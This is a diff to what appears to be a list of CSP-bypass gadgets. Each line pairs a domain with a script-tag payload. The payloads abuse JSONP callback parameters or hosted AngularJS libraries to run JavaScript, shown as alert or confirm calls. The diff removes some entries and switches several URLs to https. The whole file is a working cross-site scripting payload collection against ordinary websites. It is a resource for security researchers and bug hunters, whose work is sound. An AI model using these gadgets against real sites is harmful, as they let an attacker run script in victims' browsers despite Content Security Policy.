@@ -6,7 +6,6 @@ aax-eu.amazon.com	<script src="https://aax-eu.amazon.com/e/xsp/getAdj?callback=a
 accdn.lpsnmedia.net	<script src="https://accdn.lpsnmedia.net/api/account/1/configuration/engagement-window/window-confs/1?cb=alert"></script>
 accounts.google.com	<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
 acs.youku.com	<script src="https://acs.youku.com/h5/mtop.youku.playlog.open.get/1.0/?jsv=2.6.1&appKey=24679788&t=1734359327631&sign=6b8f8b6abb27c68582606eed336c887d&api=mtop.youku.playlog.open.get&v=1.0&dataType=jsonp&jsonpIncPrefix=headerRecord1734359327618&type=jsonp&callback=alert&data={%22nlid%22%3A%22XlQcF5xQrCcCAWoLKdGqIOhS%22%2C%22uid%22%3A%22%22%2C%22pageLength%22%3A100%2C%22timestamp%22%3A%221734359327617%22%2C%22appKey%22%3A%22qPbb2hfIYugHjMaj%22%2C%22appName%22%3A%22pc%22%2C%22hwClass%22%3A1%2C%22deviceName%22%3A%22web%22%2C%22isPlayController%22%3A1%2C%22ccode%22%3A%220502%22%2C%22clientDrmAbility%22%3A3}"></script>
-ads.yap.yahoo.com	<script src="https://ads.yap.yahoo.com/nosdk/wj/v1/getAds.do?locale=en_us&agentVersion=205&adTrackingEnabled=true&adUnitCode=2e268534-d01b-4616-83cd-709bd90690e1&apiKey=P3VYQ352GKX74CFTRH7X&gdpr=false&euconsent=&publisherUrl=https%3A%2F%2Fwww.autoblog.com&cb=alert();"></script>
 ajax.googleapis.com	<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.3/angular.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
 anchor.digitalocean.com	<script src="https://anchor.digitalocean.com/index.php/form/getForm?munchkinId=113-DTN-266&form=1402&callback=alert"></script>
 a.config.skype.com	<script src="https://a.config.skype.com/config/v1/SkypeLyncWebExperience/905_1.2.5.0?apikey=shareButton&fingerprint=0487c2fb-967c-4d8d-9635-75249326f72e&callback=alert"></script>
@@ -17,16 +16,12 @@ api.chartbeat.com	<script src="https://api.chartbeat.com/toppages/?jsonp=alert(1
 api.cxense.com	<script src="https://api.cxense.com/profile/user/segment?callback=alert"></script>
 api.dailymotion.com	<script src="https://api.dailymotion.com/video/x5gv6be?callback=alert()"></script>
 api.duckduckgo.com	<script src="https://api.duckduckgo.com/?q=x&callback=alert&format=json"></script>
-api.facebook.com	<script src="https://api.facebook.com/restserver.php?method=fql.query&callback=alert"></script>
 api.flickr.com	<script src="https://api.flickr.com/services/feeds/photos_friends.gne?user_id=44979707@N00&friends=0&display_all=1&format=json&jsoncallback=alert"></script>
 api.forismatic.com	<script src="https://api.forismatic.com/api/1.0/?format=jsonp&method=getQuote&jsonp=alert&lang=en"></script>
 api.getdrip.com	<script src="https://api.getdrip.com/client/forms/show?callback=alert(1)-"></script>
-api.github.com	<script src="https://api.github.com/gist/anything?callback=alert"></script>
 api.ipify.org	<script src="https://api.ipify.org/?format=jsonp&callback=alert(1)//"></script>
 api.m.jd.com	<script src="https://api.m.jd.com/api?appid=x&functionId=x&jsonp=alert(document.domain)//"></script>
 api.map.baidu.com	<script src="https://api.map.baidu.com/api?v=2.0&ak=&s=1&callback=alert(document.domain)"></script>
-api.meetup.com	<script src="https://api.meetup.com/Toronto-Code-Mentoring/events?callback=alert"></script>
-api.microsofttranslator.com	<script src="https://api.microsofttranslator.com/V2/Ajax.svc/GetLanguagesForTranslate?oncomplete=alert&appId=417CEAD93449502CC3C9B69FED26C54118E62BCC"></script>
 api.mixpanel.com	<script src="https://api.mixpanel.com/track/?callback=alert(1337)"></script>
 api.olark.com	<script src="https://api.olark.com/2.0/visitors/z1nRAdDubyUjGyih018BZ0P04rBy00W3?_callback=alert&_method=PUT"></script>
 api.pinterest.com	<script src="https://api.pinterest.com/v1/urls/count.json?callback=alert&url=x"></script>
@@ -46,7 +41,6 @@ app.hushly.com	<script src="https://app.hushly.com/runtime/visitor?callback=aler
 app.link	<script src="https://app.link/_r?sdk=web&callback=alert"></script>
 apps.bdimg.com	<body ng-app ng-csp><script src="https://apps.bdimg.com/libs/angular.js/1.4.6/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 assets.grubhub.com	<body ng-app ng-csp><script src="https://assets.grubhub.com/libs/js/angular/1.8.3/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
-bebezoo.1688.com	<script src="https://bebezoo.1688.com/fragment/index.htm?callback=alert(1337)"></script>
 ct.beslist.nl  <script src="https://ct.beslist.nl/ct_refresh?shopid=%22;%0a%0dalert(1);%20//%20"></script>
 bookmark.hatenaapis.com	<script src="https://bookmark.hatenaapis.com/count/entry?url=x&callback=alert"></script>
 c.y.qq.com	<script src="https://c.y.qq.com/v8/fcg-bin/v8.fcg?&notice=0&format=jsonp&channel=singer&page=list&jsonpCallback=alert"></script>
@@ -64,15 +58,14 @@ cdnjs.cloudflare.com	<script src="https://cdnjs.cloudflare.com/ajax/libs/alpinej
 cdnjs.cloudflare.com	<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
 challenges.cloudflare.com	<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=alert"></script>
 client-api.arkoselabs.com	<script src="https://client-api.arkoselabs.com/fc/a/?callback=alert"></script>
-client.crisp.chat	<script src="https://client.crisp.chat/settings/website/x/?callback=-alert(1);/*"></script>
+client.crisp.chat	<script src="https://client.crisp.chat/settings/website/x/?callback=-alert(1)//"></script>
 code.angularjs.org	<script src="https://code.angularjs.org/1.8.2/angular.min.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
 commerce.coinbase.com	<script src="https://commerce.coinbase.com/v1/checkout.js?onload=alert"></script>
 common.like.naver.com	<script src="https://common.like.naver.com/v1/search/contents?callback=alert&q=x"></script>
 connect.mail.ru	<script src="https://connect.mail.ru/share_count?url_list=x&callback=1&func=alert"></script>
 content.akamai.com	<script src="https://content.akamai.com/index.php/form/getForm?munchkinId=113-DTN-266&form=1402&callback=alert"></script>
 count-server.sharethis.com	<script src="https://count-server.sharethis.com/v2.0/get_counts?cb=alert"></script>
-cse.google.com	<script src="https://cse.google.com/cse/element/v1?cx=000470283453218169915:hcrzdwsiwrc&callback=alert"></script>
-clients1.google.com	<script src="http://clients1.google.com/complete/search?callback=alert&q=PIC&nolabels=t&client=youtube&ds=yt&_=1361575554883"></script>
+clients1.google.com	<script src="https://clients1.google.com/complete/search?callback=alert&q=PIC&nolabels=t&client=youtube&ds=yt&_=1361575554883"></script>
 clients6.google.com	<script src="https://clients6.google.com/drive/v2beta/files?callback=alert(1)"></script>
 d.adroll.com	<script src="https://d.adroll.com/user_attrs?advertisable_eid=5L5IV3X4ZNCUZFMLN5KKOD&jsonp=alert(document.domain)"></script>
 d.la3-c2-ia5.salesforceliveagent.com	<script src="https://d.la3-c2-ia5.salesforceliveagent.com/chat/rest/EmbeddedService/EmbeddedServiceConfig.jsonp?org_id=00D40000000MvPv&EmbeddedServiceConfig.configName=Support_Brandfolder_Chat_Agents&callback=alert&version=48"></script>
@@ -80,9 +73,7 @@ d1xrp9zhb3ks3c.cloudfront.net	<body ng-app ng-csp><script src="https://d1xrp9zhb
 dblp.org	<script src="https://dblp.org/search/venue/api?q=&h=1000&c=0&rd=1a&format=jsonp&callback=alert"></script>
 demo.matomo.cloud	<script src="https://demo.matomo.cloud/?module=API&method=Overlay.getTranslations&idSite=1&format=JSON&callback=alert"></script>
 dev.virtualearth.net	<script src="https://dev.virtualearth.net/REST/v1/Imagery/Metadata/Road?jsonp=alert(document.domain);//"></script>
-developer.apple.com	<script src="https://developer.apple.com/search/scripts/vendor/angular-custom.min.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
 documentation-resources.opendatasoft.com	<script src="https://documentation-resources.opendatasoft.com/api/datasets/1.0/doc-geonames-cities-5000/?format=jsonp&callback=confirm(1);"></script>
-don.bild.de	<script src="https://don.bild.de/glg/userDetails?callback=alert"></script>
 dpm.demdex.net	<script src="https://dpm.demdex.net/id?d_cb=alert"></script>
 dynamic.criteo.com	<script src="https://dynamic.criteo.com/js/ld/s2s.js?p=1&c=1&j=alert"></script>
 elysiumwebsite.s3.amazonaws.com	<body ng-app ng-csp><script src="//elysiumwebsite.s3.amazonaws.com/uploads/blog-media/rockstar/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
@@ -90,7 +81,6 @@ eu.battle.net	<script src="https://eu.battle.net/support/update/json?callback=al
 fast.wistia.com	<script src="https://fast.wistia.com/embed/medias/o75jtw7654.json?callback=alert"></script>
 forms.hsforms.com	<script src="https://forms.hsforms.com/embed/v3/form/1/00000000-0000-0000-0000-000000000000?callback=alert"></script>
 forms.hubspot.com	<script src="https://forms.hubspot.com/embed/v3/form/2059467/2e1a1b5b-27bb-447d-aac4-0b87c1e88fec?callback=alert"></script>
-geo.moatads.com	<script src="https://geo.moatads.com/n.js?callback=alert(document.domain)"></script>
 geolocation.onetrust.com	<script src="https://geolocation.onetrust.com/cookieconsentpub/v1/geo/location/alert"></script>
 gist.github.com	<script src="https://gist.github.com/renniepak/e7afcd7e727e1a0c481d955ba10441a9.json?callback=alert"></script>
 global.apis.naver.com	<script src="https://global.apis.naver.com/commentBox/cbox/web_neo_list_jsonp.json?_callback=alert"></script>
@@ -110,13 +100,12 @@ inno.blob.core.windows.net	<body ng-app ng-csp><script src="//inno.blob.core.win
 investor.coinbase.com	<script src="https://investor.coinbase.com/feed/People.svc/GetPeopleList?callback=confirm(document.domain);"></script>
 ipinfo.io	<script src="https://ipinfo.io/?format=jsonp&callback=alert"></script>
 itunes.apple.com	<script src="https://itunes.apple.com/se/rss/toppodcasts/json?callback=alert"></script>
-js-smb.devices.ovoenergy.com	<script src="https://js-smb.devices.ovoenergy.com/js-smb.min.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
 js.hcaptcha.com	<script src="https://js.hcaptcha.com/1/api.js?onload=alert&render=explicit"></script>
 kbcprod.service-now.com	<body ng-app ng-csp><script src="https://kbcprod.service-now.com/scripts/angular_includes_1.5.11.jsx"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 kendo.cdn.telerik.com	<body ng-app ng-csp><script src="https://kendo.cdn.telerik.com/2015.2.805/js/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 lghnh-mkt-prod1.campaign.adobe.com	<script src="https://lghnh-mkt-prod1.campaign.adobe.com/lgh/at_seg_list.jssp?callback=alert(1)-"></script>
 lptag.liveperson.net	<script src="https://lptag.liveperson.net/lptag/api/account/1/configuration/applications/taglets/.jsonp?v=2.0&cb=alert(1)-"></script>
-links.services.disqus.com	<script src="http://links.services.disqus.com/api/ping?format=jsonp&key=cfdfcf52dffd0a702a61bad27507376d&loc=http%3A%2F%2Fabcnews.go.com%2Fblogs%2Fhealth%2F2013%2F03%2F21%2F1-in-10-u-s-deaths-blamed-on-salt%2F&subId=2329827&v=1&jsonp=alert"></script>
+links.services.disqus.com	<script src="https://links.services.disqus.com/api/ping?format=jsonp&key=cfdfcf52dffd0a702a61bad27507376d&loc=http%3A%2F%2Fabcnews.go.com%2Fblogs%2Fhealth%2F2013%2F03%2F21%2F1-in-10-u-s-deaths-blamed-on-salt%2F&subId=2329827&v=1&jsonp=alert"></script>
 locate.pricespider.com	<script src="https://locate.pricespider.com/?callback=alert(1)"></script>
 m.media-amazon.com	<body ng-app ng-csp><script src="https://m.media-amazon.com/images/I/81cx8O4at9L.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 mango.buzzfeed.com	<script src="https://mango.buzzfeed.com/polls/service/editorial/post?poll_id=121996521&result_id=1&callback=alert(1)%2f%2f"></script>
@@ -133,7 +122,6 @@ openexchangerates.org	<script src="https://openexchangerates.org/api/latest.json
 page.gitlab.com	<script src="https://page.gitlab.com/index.php/form/getForm?munchkinId=194-VVC-221&form=1077&callback=alert"></script>
 partner.googleadservices.com	<script src="https://partner.googleadservices.com/gampad/cookie.js?domain=x&callback=alert&client=ca-pub-3374367632700222"></script>
 passport.baidu.com	<script src="https://passport.baidu.com/channel/unicast?callback=alert"></script>
-pixel.mathtag.com	<script src="https://pixel.mathtag.com/u/js?callback=alert(1)"></script>
 pixel.quantserve.com	<script src="https://pixel.quantserve.com/api/segments.json?callback=alert"></script>
 portal.ayco.com	<script src="https://portal.ayco.com/publicBundles/angularjs"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
 pubads.g.doubleclick.net	<script src="https://pubads.g.doubleclick.net/gampad/ads?gdfp_req=1&output=json_html&callback=alert&impl=fifs&json_a=1&iu_parts=4215%2Cimdb2.consumer.homepage&enc_prev_ius=%2F0%2F1%2C%2F0%2F1&prev_iu_szs=1008x150%7C1008x200%7C1008x30%7C970x250%7C9x1%2C300x250%7C11x1&cust_params=fv%3D1%26ab%3Df%26bpx%3D1%26c%3D1%26s%3D3075%252C32%26u%3D142752923777%26oe%3Dutf-8"></script>
@@ -143,13 +131,11 @@ r.skimresources.com	<script src="https://r.skimresources.com/api/?callback=alert
 raae2vza0snymz9cm3r8ix74bs71vdlz.edns.ip-api.com	<script src="https://raae2vza0snymz9cm3r8ix74bs71vdlz.edns.ip-api.com/json?callback=alert(1)-"></script>
 recaptcha.net	<script src="https://recaptcha.net/recaptcha/api.js?onload=alert"></script>
 rentokil-domains.firebaseio.com	<script src="https://rentokil-domains.firebaseio.com/.json?callback=alert(1)-"></script>
-reveal.clearbit.com	<script src="https://reveal.clearbit.com/v1/companies/reveal?authorization=pk_5fdce9b9374f2f8a4f8c9f4a1546fa35&callback=alert"></script>
 ring.com	<script src="https://ring.com/partials/consent/sv-SE/strings.json?callback=alert"></script>
 romania.amazon.com	<body ng-app ng-csp><script src="https://romania.amazon.com/app/vendor.min.js"></script><input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'></body>
 s.fqtag.com	<script src="https://s.fqtag.com/b?callback=alert(1)"></script>
 s.ytimg.com	<body ng-app ng-csp><script src="https://s.ytimg.com/yts/jslib/angular.min-vfl8oYsy-.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 search.yahoo.com	<script src="https://search.yahoo.com/sugg/gossip/gossip-us-ura/?f=1&.crumb=wYtclSpdh3r&output=sd1&command=&pq=&l=1&bm=3&appid=exp-ats1.l7.search.vip.ir2.yahoo.com&t_stmp=1571806738592&nresults=10&bck=1he6d8leq7ddu%26b%3D3%26s%3Dcb&csrcpvid=8wNpljk4LjEYuM1FXaO1vgNfMTk1LgAAAAA5E2a9&vtestid=&mtestid=&spaceId=1197804867&callback=confirm"></script>
-secure.adnxs.com	<script src="https://secure.adnxs.com/getuidp?callback=alert(1)"></script>
 secure.gravatar.com	<script src="https://secure.gravatar.com/930fc2e7cd239606c398bff5b5fc12e7.json?callback=alert"></script>
 secure.quantserve.com	<script src="https://secure.quantserve.com/api/segments.json?callback=alert"></script>
 securepubads.g.doubleclick.net	<script src="https://securepubads.g.doubleclick.net/gampad/ads?gdfp_req=1&output=json_html&iu=%2F32173961%2Fdesktop%2Ffrontpage%2Flisting&sz=300x250&url=https%3A%2F%2Fwww.reddit.com%2F&vrg=147&callback=alert"></script>
@@ -164,15 +150,12 @@ ssl.gstatic.com	<body ng-app ng-csp><script src="//ssl.gstatic.com/fsn/angular_j
 sso.bytedance.com	<script src="https://sso.bytedance.com/watermark/?callback=alert"></script>
 st3.zoom.us	<script src="https://st3.zoom.us/static/6.2.7600/js/lib/angular.min.js"></script><div ng-app><input autofocus ng-focus="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
 static.parastorage.com	<body ng-app ng-csp><script src="https://static.parastorage.com/services/third-party/angularjs/1.4.5/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
-storage.googleapis.com	<script src="https://storage.googleapis.com/bypass_csp/xss.js"></script>
 storemapper-herokuapp-com.global.ssl.fastly.net	<script src="https://storemapper-herokuapp-com.global.ssl.fastly.net/api/users/9223/stores.js?callback=alert(1)-"></script>
 suggest.taobao.com	<script src="https://suggest.taobao.com/sug?callback=alert"></script>
 suggestqueries-clients6.youtube.com	<script src="https://suggestqueries-clients6.youtube.com/complete/search?client=youtube&q=$query&callback=alert"></script>
 support.zendesk.com	<script src="https://support.zendesk.com/accounts/reminder?callback=alert(window.location)//"></script>
 sync.im-apps.net	<script src="https://sync.im-apps.net/imid/segment?callback=alert(1)&token=VXoW9wEaCAYxiIkb8Mzm7Q"></script>
 tagmanager.google.com	<script src="https://tagmanager.google.com/debug/api/vtinfo?gtm_auth=a-0uanYFkML7e3v7Vmxpwg&env_id=env-8&public_id=GTM-TWMCBFD&templates=&callback=alert"></script>
-tcr9i.openai.com	<script src="https://tcr9i.openai.com/fc/a/?callback=alert"></script>
-thehive.shopify.io	<script src="https://thehive.shopify.io/scripts/vendor.78eed977.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
 thiscanbeanything.zendesk.com	<script src="https://thiscanbeanything.zendesk.com/sc/faye/?message=[{%22channel%22:%22%22}]&jsonp=alert"></script>
 translate.google.com	<script src="https://translate.google.com/translate_a/element.js?cb=alert"></script>
 translate.googleapis.com	<script src="https://translate.googleapis.com/$discovery/rest?version=v3&callback=alert();"></script>
@@ -214,7 +197,6 @@ www.microsoft.com	<script src="https://www.microsoft.com/en-us/research/wp-json?
 www.paypal.com	<script src="https://www.paypal.com/checkoutnow/remembered?callback=alert"></script>
 www.recaptcha.net	<script src="https://www.recaptcha.net/recaptcha/api.js?onload=alert"></script>
 www.reddit.com	<script src="https://www.reddit.com/.json?limit=1&jsonp=alert"></script>
-www.roblox.com	<script src="https://www.roblox.com/item-thumbnails?params=[{assetId:1}]&jsoncallback=alert"></script>
 www.st.com	<body ng-app ng-csp><script src="https://www.st.com/etc/clientlibs/st-search-cx/stangularjs.min.d9f5c8180af41b5cae710870b6b018fe.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 www.yastat.net	<script src="https://www.yastat.net/s3/milab/js/angular.min.js"></script><div ng-app><input autofocus ng-focus="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
 www.yastatic.net	<script src="https://www.yastatic.net/s3/milab/js/angular.min.js"></script><div ng-app><input autofocus ng-focus="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
@@ -225,6 +207,5 @@ yastatic.net	<script src="https://yastatic.net/s3/milab/js/angular.min.js"></scr
 yuedust.yuedu.126.net	<body ng-app ng-csp><script src="//yuedust.yuedu.126.net/js/components/angular/angular.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
 yugiohmonstrosdeduelo.blogspot.com	<script src="https://yugiohmonstrosdeduelo.blogspot.com/feeds/posts/summary?callback=alert"></script>
 zhike.help.360.cn	<script src="https://zhike.help.360.cn/api/v1/robotWindow?callback=alert(1)-"></script>
-zhuanjia.sogou.com	<script src="https://zhuanjia.sogou.com/base/ajax/login/login-init?callback=alert(1)-"></script>
 omtr2.partners.salesforce.com   <script src="https://omtr2.partners.salesforce.com/id?callback=alert"></script>
 
